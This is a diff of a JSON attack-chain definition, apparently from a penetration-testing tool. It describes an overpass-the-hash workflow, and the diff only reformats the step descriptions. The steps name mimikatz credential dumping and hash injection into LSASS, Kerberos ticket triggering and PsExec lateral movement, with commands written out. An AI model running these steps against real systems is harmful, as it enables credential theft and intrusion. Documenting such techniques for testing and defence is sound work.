@@ -1,7 +1,7 @@
 {
   "id": "windows-lateral-overpass-hash",
   "name": "Overpass-the-Hash Attack Chain (NTLM to Kerberos)",
-  "description": "Complete overpass-the-hash workflow: convert NTLM hash to Kerberos TGT, use for tools requiring Kerberos authentication (Microsoft PsExec)",
+  "description": "Complete overpass-the-hash workflow: convert NTLM hash to Kerberos TGT, use for tools requiring Kerberos authentication (Microsoft PsExec).\n\nThis technique upgrades NTLM authentication to Kerberos when tools only support Kerberos tickets.",
   "version": "1.0.0",
   "metadata": {
     "author": "CRACK Development Team",
@@ -41,7 +41,7 @@
       "id": "verify-hash",
       "name": "Verify NTLM Hash Obtained",
       "objective": "Confirm NTLM hash is available and properly formatted",
-      "description": "Ensure hash is 32 hexadecimal characters with known username and domain. Verify hash was extracted from mimikatz sekurlsa::logonpasswords or secretsdump output.",
+      "description": "Ensure hash is 32 hexadecimal characters with known username and domain.\nVerify hash was extracted from mimikatz sekurlsa::logonpasswords or secretsdump output.",
       "command_ref": "pth-verify-hash-format",
       "dependencies": [],
       "evidence": [
@@ -67,7 +67,7 @@
       "id": "launch-mimikatz",
       "name": "Launch Mimikatz with Debug Privileges",
       "objective": "Start mimikatz and enable SeDebugPrivilege for LSASS access",
-      "description": "Run mimikatz as Administrator and execute privilege::debug. This enables access to LSASS process where credentials are injected.",
+      "description": "Run mimikatz as Administrator and execute privilege::debug.\nThis enables access to LSASS process where credentials are injected.",
       "command_ref": "overpass-mimikatz-pth",
       "dependencies": [
         "verify-hash"
@@ -95,7 +95,7 @@
       "id": "inject-hash",
       "name": "Inject NTLM Hash with sekurlsa::pth",
       "objective": "Create new PowerShell process with NTLM hash injected into LSASS",
-      "description": "Execute sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell. This spawns PowerShell with injected credentials.",
+      "description": "Execute sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.\nThis spawns PowerShell with injected credentials.",
       "command_ref": "overpass-mimikatz-pth",
       "dependencies": [
         "launch-mimikatz"
@@ -123,7 +123,7 @@
       "id": "trigger-kerberos",
       "name": "Trigger Kerberos TGT Request",
       "objective": "Force Kerberos authentication to generate TGT using injected hash",
-      "description": "From new PowerShell window, run 'net use \\\\<TARGET>' using HOSTNAME (not IP). This triggers Kerberos pre-authentication using injected hash, generating TGT.",
+      "description": "From new PowerShell window, run 'net use \\\\<TARGET>' using HOSTNAME (not IP).\nThis triggers Kerberos pre-authentication using injected hash, generating TGT.",
       "command_ref": "overpass-net-use-trigger",
       "dependencies": [
         "inject-hash"
@@ -151,7 +151,7 @@
       "id": "verify-tickets",
       "name": "Verify Kerberos Tickets Created",
       "objective": "Confirm TGT and TGS tickets were generated using klist command",
-      "description": "Run klist in PowerShell to display cached Kerberos tickets. Should see TGT (Server: krbtgt/<DOMAIN>) and TGS (Server: cifs/<TARGET>).",
+      "description": "Run klist in PowerShell to display cached Kerberos tickets.\nShould see TGT (Server: krbtgt/<DOMAIN>) and TGS (Server: cifs/<TARGET>).",
       "command_ref": "kerberos-klist-verify",
       "dependencies": [
         "trigger-kerberos"
@@ -180,7 +180,7 @@
       "id": "use-microsoft-psexec",
       "name": "Execute Microsoft PsExec with Kerberos",
       "objective": "Use official Microsoft PsExec64.exe with Kerberos tickets for lateral movement",
-      "description": "From PowerShell with injected credentials, run PsExec64.exe \\\\<TARGET> cmd. PsExec will use cached Kerberos tickets for authentication (no password needed).",
+      "description": "From PowerShell with injected credentials, run PsExec64.exe \\\\<TARGET> cmd.\nPsExec will use cached Kerberos tickets for authentication (no password needed).",
       "command_ref": "psexec-sysinternals-interactive",
       "dependencies": [
         "verify-tickets"
@@ -208,7 +208,7 @@
       "id": "verify-lateral-movement",
       "name": "Verify Lateral Movement Success",
       "objective": "Confirm shell is on target system with correct user context",
-      "description": "Run whoami and hostname to verify. Context should be domain user (from hash), not SYSTEM.",
+      "description": "Run whoami and hostname to verify.\nContext should be domain user (from hash), not SYSTEM.",
       "command_ref": "verify-root-access-ad",
       "dependencies": [
         "use-microsoft-psexec"
